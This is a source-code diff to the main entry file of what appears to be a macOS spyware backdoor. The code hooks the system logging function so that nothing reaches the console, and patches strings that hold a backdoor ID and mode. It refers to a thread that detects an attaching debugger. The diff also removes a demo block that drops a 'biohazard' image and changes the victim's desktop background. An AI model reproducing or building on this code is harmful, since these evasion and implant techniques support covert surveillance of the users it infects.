@@ -11,12 +11,12 @@
 
 #import "RCSMCore.h"
 #import "RCSMCommon.h"
-
-#import "RCSMDesktopImage.h"
 #import "mach_override.h"
 
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
+
+#import "NSMutableData+SHA1.h"
 
 extern void lionSendEventToPid(pid_t pid);
 
@@ -41,7 +41,11 @@ int main (int argc, const char *argv[])
   // suppress every logging in console
   mach_override("_asl_send", "libsystem_c",(void *)&_hook_asl_send, (void **)&asl_send_reentry);
 #endif
-
+  
+  // FIXED- fixing string binary patched
+  gMode[5] = 0;
+  gBackdoorID[14] = gBackdoorID[15] = 0;
+  
   // Fix for lion: AppleEvents only from unhidden proc
   if (argc > 1) 
     {
@@ -107,28 +111,6 @@ int main (int argc, const char *argv[])
     }
   
   [offlineFlagPath release];
-  
-#ifdef DEMO_VERSION
-  NSString *appName = [[[NSBundle mainBundle] executablePath] lastPathComponent];
-  
-  if ([appName isEqualToString: @"System Preferences"] == FALSE)
-    {
-      if (getuid() != 0 && geteuid() != 0)
-        {
-          NSString *filePath = [[NSString alloc] initWithFormat: @"%@/bio.bmp",
-                                NSHomeDirectory()];
-          
-          NSData *bmpData = [[NSData alloc] initWithBytes: biohazard_bmp
-                                                   length: biohazard_bmp_len];
-          [bmpData writeToFile: filePath atomically: YES];
-          
-          changeDesktopBackground(filePath, FALSE);
-          
-          [filePath release];
-          [bmpData release];
-        }
-    }
-#endif
   
   //
   // Spawn a thread who checks whenever a debugger is attaching our app
